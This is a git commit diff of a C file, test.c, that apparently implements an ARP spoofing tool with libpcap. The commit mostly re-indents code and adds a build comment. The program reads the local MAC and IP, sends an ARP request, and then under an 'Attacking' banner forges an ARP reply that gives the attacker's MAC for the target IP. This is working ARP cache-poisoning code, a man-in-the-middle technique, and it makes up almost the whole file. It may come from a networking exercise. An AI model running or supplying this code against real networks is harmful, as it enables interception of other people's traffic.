1c3505c78504246d61368e7eb206261cd90d0de7
adsbh7 <31874686+adsbh7@users.noreply.github.com>
2017-10-10 16:16:31 +0900

    Update test.c

--- test.c
+++ test.c
@@ -1,3 +1,7 @@
+
+// ubuntu - command : gcc -o test test.c -lpcap 
+
+
 #include <pcap.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -52,7 +56,7 @@ void create_packet (u_char *packet, struct in_addr sendip, struct in_addr target
 
 int main(int argc, char* argv[])
 {
-        char *dev = argv[1];
+        	char *dev = argv[1];
 		unsigned char *sender = argv[2];
 		char *target = argv[3];
 		int i;
@@ -77,11 +81,11 @@ int main(int argc, char* argv[])
 		{
                 fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
                 return -1;
-        }
+       		}
 
 
 		struct pcap_pkthdr* header;
-        const u_char* packet;
+       		const u_char* packet;
 		u_char t_packet[42];			// ethernet(14) + arp(28)
 
 		struct libnet_ethernet_hdr * ethhdr;
@@ -100,55 +104,55 @@ int main(int argc, char* argv[])
 				printf("IP error\n");
 		
 		int fd;
-        struct ifreq ifrq;              // net/if.h에 정의
-        struct sockaddr_in * sin;       // in.h
+        	struct ifreq ifrq;              // net/if.h에 정의
+       		struct sockaddr_in * sin;       // in.h
 		
 
 		fd = socket(AF_INET, SOCK_DGRAM, 0);
-        strcpy(ifrq.ifr_name, dev);
+        	strcpy(ifrq.ifr_name, dev);
 
-        if(ioctl(fd, SIOCGIFHWADDR, &ifrq) < 0)
-        {
-                perror("ioctl error");
-                return -1;
-        }
+        	if(ioctl(fd, SIOCGIFHWADDR, &ifrq) < 0)
+        	{
+              	  perror("ioctl error");
+                  return -1;
+        	}
 
-        printf("My MAC address : ");
+       		printf("My MAC address : ");
 		for(i=0;i<6;i++)
-        {
-                printf("%02X", ifrq.ifr_hwaddr.sa_data[i]); // mac address
-                if(i==5) break;
-                printf(":");
-        }
-        printf("\n");
+        	{
+                	printf("%02X", ifrq.ifr_hwaddr.sa_data[i]); // mac address
+                	if(i==5) break;
+                	printf(":");
+        	}
+        	printf("\n");
 
-	memcpy(mac, ifrq.ifr_hwaddr.sa_data,6);
+		memcpy(mac, ifrq.ifr_hwaddr.sa_data,6);
 		
-      if(ioctl(fd, SIOCGIFADDR, &ifrq) < 0)
-        {
-                perror("ioctl error");
-                return -1;
-        }
+	        if(ioctl(fd, SIOCGIFADDR, &ifrq) < 0)
+        	{
+                	perror("ioctl error");
+                	return -1;
+        	}
 
-        sin = (struct sockaddr_in *)&ifrq.ifr_addr;
-        printf("My IP address : %s\n", inet_ntoa(sin->sin_addr));  // sin_addr : ip 주소 나타내는 32 비트 정수 타입
+	        sin = (struct sockaddr_in *)&ifrq.ifr_addr;
+	        printf("My IP address : %s\n", inet_ntoa(sin->sin_addr));  // sin_addr : ip 주소 나타내는 32 비트 정수 타입
 
-        close(fd);
+        	close(fd);
 
 		
 		while(1)
 		{
 		
 		
-		create_packet(t_packet, sin->sin_addr, send_ip, mac, "\xff\xff\xff\xff\xff\xff", 1);
+			create_packet(t_packet, sin->sin_addr, send_ip, mac, "\xff\xff\xff\xff\xff\xff", 1);
 		
-		check = pcap_sendpacket(handle, t_packet, 42);	// ethernet(14) + arp(28)
+			check = pcap_sendpacket(handle, t_packet, 42);	// ethernet(14) + arp(28)
 
-		if(check == -1)
-		{
+			if(check == -1)
+			{
 				pcap_perror(handle,0);
 				pcap_close(handle);
-		}
+			}
 
 
 	
@@ -177,91 +181,88 @@ int main(int argc, char* argv[])
 				for(i=0;i<6;i++)
 				{
 					printf("%02X", arphdr->arp_sha[i]);	
-                    if(i==5) break;
-                    printf(":");
+                    			if(i==5) break;
+                    			printf(":");
 				}
 
 				printf("\n");
-			break;
+				break;
 			}
 			else if (res == -1 || res == -2) break;
 		}
 			
-			printf("-------------Attacking--------------");
+			
+		printf("-------------Attacking--------------");
 						
-						for(i=0;i<6;i++)
-                        {
-                                arphdr->arp_tha[i] = arphdr->arp_sha[i];
-								arphdr->arp_sha[i] = mac[i];
-                        }
+		for(i=0;i<6;i++)
+                {
+                	arphdr->arp_tha[i] = arphdr->arp_sha[i];
+			arphdr->arp_sha[i] = mac[i];
+                }
 
-						printf("\n");
+		printf("\n");
 						
-						for(i=0;i<4;i++)
-						{
+		for(i=0;i<4;i++)
+		{
 								
-							arphdr->arp_tpa[i] = arphdr->arp_spa[i];
+			arphdr->arp_tpa[i] = arphdr->arp_spa[i];
 							
-						}
-						printf("\n");
+		}
+		
+		printf("\n");
 			
-						printf("Sender MAC : ");
+		printf("Sender MAC : ");
 						
-						for(i=0;i<6;i++)
-                        {
-                                printf("%02X", mac[i]);	
-                                if(i==5) break;
-                                printf(":");
-                        }
+		for(i=0;i<6;i++)
+                {
+                         printf("%02X", mac[i]);	
+                         if(i==5) break;
+                         printf(":");
+                }
 
-						printf("\n");
+		printf("\n");
 						
-						printf("Sender IP : %s",argv[3]);
+		printf("Sender IP : %s",argv[3]);
 						
 
-						printf("\n");
+		printf("\n");
 
-						printf("Target MAC : ");
+		printf("Target MAC : ");
 				 
-						for(i=0;i<6;i++)
-                        {
-                                printf("%02X", arphdr->arp_tha[i]);	
-                                if(i==5) break;
-                                printf(":");
-                        }
+		for(i=0;i<6;i++)
+                {
+                          printf("%02X", arphdr->arp_tha[i]);	
+                          if(i==5) break;
+                          printf(":");
+                }
 
-						printf("\n");
-						printf("Target IP : ");
+		printf("\n");
+		printf("Target IP : ");
 						
-						for(i=0;i<4;i++)
-                        {
-                                printf("%d", arphdr->arp_tpa[i]);	
-                                if(i==3) break;
-                                printf(".");
-                        }
-						printf("\n");
+		for(i=0;i<4;i++)
+                {
+                          printf("%d", arphdr->arp_tpa[i]);	
+                          if(i==3) break;
+                          printf(".");
+                }
+		printf("\n");
 
-						if(inet_aton(argv[3], &target_ip)==0)
-							printf("IP error\n");
+		if(inet_aton(argv[3], &target_ip)==0)
+		printf("IP error\n");
 
-						create_packet(t_packet, target_ip, send_ip, mac, arphdr->arp_tha, 2);
+		create_packet(t_packet, target_ip, send_ip, mac, arphdr->arp_tha, 2);
 
-
-
-
-
-
-						check = pcap_sendpacket(handle, t_packet, 42);	// ethernet(14) + arp(28)
+		check = pcap_sendpacket(handle, t_packet, 42);	// ethernet(14) + arp(28)
 			
-						if(check == -1)
-						{
-							pcap_perror(handle,0);
-							pcap_close(handle);
-						}		
+		if(check == -1)
+		{
+			pcap_perror(handle,0);
+			pcap_close(handle);
+		}		
 						
 					
-		pcap_close(handle);
-		return 0;
+	pcap_close(handle);
+	return 0;
 }
 
 
